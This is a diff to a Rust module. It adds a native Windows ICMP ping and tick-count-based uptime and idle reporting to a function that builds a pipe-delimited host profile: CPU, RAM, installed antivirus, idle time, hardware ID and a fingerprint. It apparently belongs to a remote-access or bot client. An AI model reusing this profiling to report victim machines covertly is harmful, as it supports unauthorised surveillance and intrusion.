@@ -1,4 +1,4 @@
-use std::{env, process::Command};
+use std::{env, net::ToSocketAddrs, process::Command};
 
 use ed25519_dalek::SigningKey;
 use hkdf::Hkdf;
@@ -83,7 +83,7 @@ pub fn record(target: &str, ping_ms: Option<u128>, fp: &str) -> String {
         cpu,
         ram,
         antivirus,
-        uptime(ps(text::UPTIME)),
+        uptime(),
         afk,
         ping_ms.map_or_else(|| "Unknown".into(), |v| format!("{v} ms")),
         hwid,
@@ -93,6 +93,77 @@ pub fn record(target: &str, ping_ms: Option<u128>, fp: &str) -> String {
     .map(clean)
     .collect::<Vec<_>>()
     .join("|")
+}
+
+pub fn ping(target: &str) -> Option<u128> {
+    #[cfg(windows)]
+    {
+        if let Ok(mut addrs) = (target, 0u16).to_socket_addrs() {
+            if let Some(std::net::SocketAddr::V4(addr)) =
+                addrs.find(|a| matches!(a, std::net::SocketAddr::V4(_)))
+            {
+                #[repr(C)]
+                struct IpOptionInformation {
+                    ttl: u8,
+                    tos: u8,
+                    flags: u16,
+                    options_size: u8,
+                    options_data: *mut u8,
+                }
+                #[repr(C)]
+                struct EchoReply {
+                    address: u32,
+                    status: u32,
+                    round_trip_time: u32,
+                    data_size: u16,
+                    reserved: u16,
+                    data: *mut core::ffi::c_void,
+                    options: IpOptionInformation,
+                }
+                #[link(name = "iphlpapi")]
+                unsafe extern "system" {
+                    fn IcmpCreateFile() -> *mut core::ffi::c_void;
+                    fn IcmpCloseHandle(handle: *mut core::ffi::c_void) -> i32;
+                    fn IcmpSendEcho(
+                        handle: *mut core::ffi::c_void,
+                        destination: u32,
+                        request_data: *const core::ffi::c_void,
+                        request_size: u16,
+                        request_options: *const IpOptionInformation,
+                        reply_buffer: *mut core::ffi::c_void,
+                        reply_size: u32,
+                        timeout: u32,
+                    ) -> u32;
+                }
+
+                let handle = unsafe { IcmpCreateFile() };
+                if !handle.is_null() {
+                    let payload = b"ztsec";
+                    let mut reply = [0u8; core::mem::size_of::<EchoReply>() + 32];
+                    let count = unsafe {
+                        IcmpSendEcho(
+                            handle,
+                            u32::from_be_bytes(addr.ip().octets()),
+                            payload.as_ptr() as *const _,
+                            payload.len() as u16,
+                            core::ptr::null(),
+                            reply.as_mut_ptr() as *mut _,
+                            reply.len() as u32,
+                            500,
+                        )
+                    };
+                    let _ = unsafe { IcmpCloseHandle(handle) };
+                    if count > 0 {
+                        let echo = unsafe { &*(reply.as_ptr() as *const EchoReply) };
+                        if echo.status == 0 {
+                            return Some(echo.round_trip_time as u128);
+                        }
+                    }
+                }
+            }
+        }
+    }
+    None
 }
 
 fn machine_id() -> Option<String> {
@@ -142,7 +213,7 @@ fn afk() -> String {
         }
         #[link(name = "kernel32")]
         unsafe extern "system" {
-            fn GetTickCount() -> u32;
+            fn GetTickCount64() -> u64;
         }
 
         let mut info = LastInput {
@@ -150,18 +221,23 @@ fn afk() -> String {
             tick: 0,
         };
         if unsafe { GetLastInputInfo(&mut info) } != 0 {
-            let now = unsafe { GetTickCount() };
+            let now = unsafe { GetTickCount64() } as u32;
             return human(now.wrapping_sub(info.tick) as u64);
         }
     }
     "0s".into()
 }
 
-fn uptime(v: String) -> String {
-    v.trim()
-        .parse::<u64>()
-        .map(human)
-        .unwrap_or_else(|_| "Unknown".into())
+fn uptime() -> String {
+    #[cfg(windows)]
+    {
+        #[link(name = "kernel32")]
+        unsafe extern "system" {
+            fn GetTickCount64() -> u64;
+        }
+        return human(unsafe { GetTickCount64() } / 1000);
+    }
+    "Unknown".into()
 }
 
 fn human(mut secs: u64) -> String {
